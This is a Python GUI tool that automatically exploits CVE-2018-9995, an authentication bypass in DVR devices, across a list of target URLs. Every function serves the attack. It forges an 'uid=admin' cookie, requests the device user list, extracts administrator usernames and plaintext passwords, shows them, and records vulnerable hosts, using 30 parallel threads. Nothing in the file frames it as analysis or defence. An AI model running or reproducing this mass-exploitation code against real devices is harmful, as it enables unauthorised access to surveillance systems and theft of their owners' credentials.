import requests
import json
import tkinter as tk
from tkinter import *
from PIL.ImageTk import PhotoImage
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def dvr_login_bypass_exp(url):
    try:
        poc = r"""/device.rsp?opt=user&cmd=list"""
        url = url + poc
        resp = requests.get(url,headers={"Cookie": "uid=admin"},verify=False,timeout=3)
        res = json.loads((resp.text).encode("utf-8"))
        account = res['list'][0]['uid']
        password = res['list'][0]['pwd']
        if password != "" and "*" not in password:
            dvr_login_bypass_text.insert(END,"[! ! ! ! ! ! ] Vulnerable url:-" + url + ";The account obtained is:     " + str(account) + "     ,The password is:     " + str(password) + "     \n")
            dvr_login_bypass_text.see(END)
            with open("[exists]DVR_Login_Bypass_CVE_2018_9995_url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            dvr_login_bypass_text.insert(END, "[×]URL without vulnerability:" + url + "\n")
            dvr_login_bypass_text.see(END)
    except Exception as err:
        dvr_login_bypass_text.insert(END, "[×]The target request failed, and the error content:" + str(err) + "\n")
        dvr_login_bypass_text.see(END)
def get_dvr_login_bypass_addr():
    with open("corrected url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def dvr_login_bypass_gui():
    dvr_login_bypass = Toplevel()
    dvr_login_bypass.geometry("1035x455")
    dvr_login_bypass.title("DVR login bypass(CVE-2018-9995) [auto-muti-exp]")
    dvr_login_bypass.resizable(0, 0)
    logo = PhotoImage(file="./logo.ico")
    dvr_login_bypass.tk.call('wm', 'iconphoto', dvr_login_bypass._w, logo)
    global dvr_login_bypass_text
    dvr_login_bypass_text = scrolledtext.ScrolledText(dvr_login_bypass,width=123, height=25)
    dvr_login_bypass_text.grid(row=0, column=0, padx=10, pady=10)
    dvr_login_bypass_text.see(END)
    addrs = get_dvr_login_bypass_addr()
    max_thread_num = 30
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(dvr_login_bypass_exp, addr)
    dvr_login_bypass.mainloop()